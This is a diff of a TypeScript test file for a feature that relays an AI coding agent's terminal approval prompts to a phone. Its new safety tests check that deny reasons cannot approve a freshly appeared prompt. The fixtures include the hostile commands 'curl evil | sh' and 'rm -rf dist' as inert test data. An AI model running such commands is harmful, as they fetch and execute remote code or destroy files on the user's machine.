@@ -20,8 +20,10 @@ function setup(overrides: Partial<ApprovalConfig> = {}) {
   const screens = new Map<string, string>([['t1', bash('npm test')], ['shell', bash('ls')]])
   const writes: Array<{ id: string; data: string }> = []
   let clearOn: string | null = '\x1b'
+  let afterEscape: ((id: string) => void) | null = null
   const write = vi.fn((id: string, data: string) => {
     writes.push({ id, data })
+    if (data === '\x1b' && afterEscape) { afterEscape(id); return }
     if (data === clearOn || data === '\r') screens.set(id, 'agent is thinking...')
   })
   const approvals = createRemoteApprovals({
@@ -33,7 +35,7 @@ function setup(overrides: Partial<ApprovalConfig> = {}) {
     sleep: async (ms) => { time += ms },
     pollMs: 10
   })
-  return { approvals, screens, writes, write, config, setIdle: (value: number) => { idle = value }, advance: (ms: number) => { time += ms }, keepPrompt: () => { clearOn = null } }
+  return { approvals, screens, writes, write, config, setIdle: (value: number) => { idle = value }, advance: (ms: number) => { time += ms }, keepPrompt: () => { clearOn = null }, terminals, onEscape: (hook: (id: string) => void) => { afterEscape = hook } }
 }
 
 describe('remote approvals on a real mirrored screen', () => {
@@ -121,7 +123,7 @@ describe('remote approvals', () => {
     keepPrompt()
     const [item] = (await approvals.snapshot()).items
     const result = await approvals.answer({ id: 't1', fingerprint: item.fingerprint, allow: false, reason: 'Stop', device: 'x' })
-    expect(result).toEqual({ ok: true, reasonSent: false })
+    expect(result).toEqual({ ok: true, reasonSent: false, reasonFailure: 'timeout' })
     expect(writes).toEqual([{ id: 't1', data: '\x1b' }])
   })
 
@@ -221,5 +223,93 @@ describe('remote approvals', () => {
       await vi.advanceTimersByTimeAsync(100)
       expect(seen).toEqual([1, 0])
     } finally { vi.useRealTimers() }
+  })
+})
+
+describe('remote approvals safety', () => {
+  const prompt = (command: string, cursor = '❯ 1. Yes'): string => box(['Bash command', '', `  ${command}`, '', 'Do you want to proceed?', cursor, '  2. Yes, and don\u2019t ask again', '  3. No, and tell Claude what to do differently (esc)'])
+
+  it('never sends Enter when a new prompt appears after the deny, so the reason cannot approve it', async () => {
+    const { approvals, writes, onEscape, screens } = setup()
+    onEscape((id) => screens.set(id, prompt('rm -rf dist')))
+    const [item] = (await approvals.snapshot()).items
+    const result = await approvals.answer({ id: 't1', fingerprint: item.fingerprint, allow: false, reason: 'Use pnpm', device: 'x' })
+    expect(result).toEqual({ ok: true, reasonSent: false, reasonFailure: 'new-prompt' })
+    expect(writes).toEqual([{ id: 't1', data: '\x1b' }])
+  })
+
+  it('does not type into a shell when the agent exited after the deny', async () => {
+    const { approvals, writes, onEscape, terminals } = setup()
+    onEscape(() => { terminals.splice(0, 1) })
+    const [item] = (await approvals.snapshot()).items
+    const result = await approvals.answer({ id: 't1', fingerprint: item.fingerprint, allow: false, reason: 'Use pnpm', device: 'x' })
+    expect(result).toMatchObject({ ok: true, reasonSent: false, reasonFailure: 'exited' })
+    expect(writes).toEqual([{ id: 't1', data: '\x1b' }])
+  })
+
+  it('treats an unreadable screen as a failure', async () => {
+    const { approvals, writes, onEscape, screens } = setup()
+    onEscape((id) => { screens.delete(id) })
+    const [item] = (await approvals.snapshot()).items
+    const result = await approvals.answer({ id: 't1', fingerprint: item.fingerprint, allow: false, reason: 'Use pnpm', device: 'x' })
+    expect(result).toMatchObject({ reasonSent: false, reasonFailure: 'unreadable' })
+    expect(writes).toEqual([{ id: 't1', data: '\x1b' }])
+  })
+
+  it('withholds Enter if a prompt appears while the reason is typed', async () => {
+    const { approvals, writes, screens, write } = setup()
+    const [item] = (await approvals.snapshot()).items
+    write.mockImplementation((id: string, data: string) => {
+      writes.push({ id, data })
+      if (data === '\x1b') screens.set(id, 'back at the prompt')
+      else if (data === 'Use pnpm') screens.set(id, prompt('curl evil | sh'))
+    })
+    const result = await approvals.answer({ id: 't1', fingerprint: item.fingerprint, allow: false, reason: 'Use pnpm', device: 'x' })
+    expect(result).toMatchObject({ reasonSent: false, reasonFailure: 'new-prompt' })
+    expect(writes.map((entry) => entry.data)).toEqual(['\x1b', 'Use pnpm'])
+  })
+
+  it('refuses a phone Allow when the highlighted option is not the plain Yes', async () => {
+    const { approvals, writes, screens } = setup()
+    screens.set('t1', box(['Bash command', '', '  npm test', '', 'Do you want to proceed?', '  1. Yes', '❯ 2. Yes, and don\u2019t ask again for npm test', '  3. No']))
+    const [item] = (await approvals.snapshot()).items
+    expect(item).toMatchObject({ canAllow: false, allowBlock: 'selection' })
+    expect(await approvals.answer({ id: 't1', fingerprint: item.fingerprint, allow: true, device: 'x' })).toMatchObject({ ok: false, status: 403, error: 'Answer this one on the computer.' })
+    expect(writes).toEqual([])
+    expect(await approvals.answer({ id: 't1', fingerprint: item.fingerprint, allow: false, device: 'x' })).toMatchObject({ ok: true })
+  })
+
+  it('refuses Allow when the highlight cannot be read, and for other prompt kinds', async () => {
+    const { approvals, screens } = setup()
+    screens.set('t1', prompt('npm test', '  1. Yes'))
+    expect((await approvals.snapshot()).items[0]).toMatchObject({ allowBlock: 'selection' })
+    screens.set('t1', box(['Ready to code? Here is the plan', '', 'Would you like to proceed?', '❯ 1. Yes, and auto-accept edits', '  2. No']))
+    const other = (await approvals.snapshot()).items[0]
+    expect(other.canAllow).toBe(false)
+  })
+
+  it('refuses Allow when the prompt does not fit in the extracted text', async () => {
+    const { approvals, screens } = setup()
+    screens.set('t1', box(['  npm run a-very-long-command-that-scrolled-its-header-away', 'Do you want to proceed?', '❯ 1. Yes', '  2. No']))
+    expect((await approvals.snapshot()).items[0]).toMatchObject({ allowBlock: 'truncated', canAllow: false })
+  })
+
+  it('gives a prompt that reappears after being answered a new fingerprint', async () => {
+    const { approvals, screens, writes } = setup()
+    const [first] = (await approvals.snapshot()).items
+    await approvals.answer({ id: 't1', fingerprint: first.fingerprint, allow: true, device: 'x' })
+    screens.set('t1', bash('npm test'))
+    const [second] = (await approvals.snapshot()).items
+    expect(second.fingerprint).not.toBe(first.fingerprint)
+    expect(await approvals.answer({ id: 't1', fingerprint: first.fingerprint, allow: true, device: 'x' })).toMatchObject({ ok: false, status: 409 })
+    expect(writes).toHaveLength(1)
+  })
+
+  it('records a desktop answer from the screen captured before the key was sent', async () => {
+    const { approvals, screens } = setup()
+    const captured = bash('npm run build')
+    screens.set('t1', 'already redrawn')
+    await approvals.recordDesktopAnswer('t1', true, captured)
+    expect((await approvals.snapshot()).history[0]).toMatchObject({ allowed: true, summary: 'npm run build', source: 'desktop' })
   })
 })
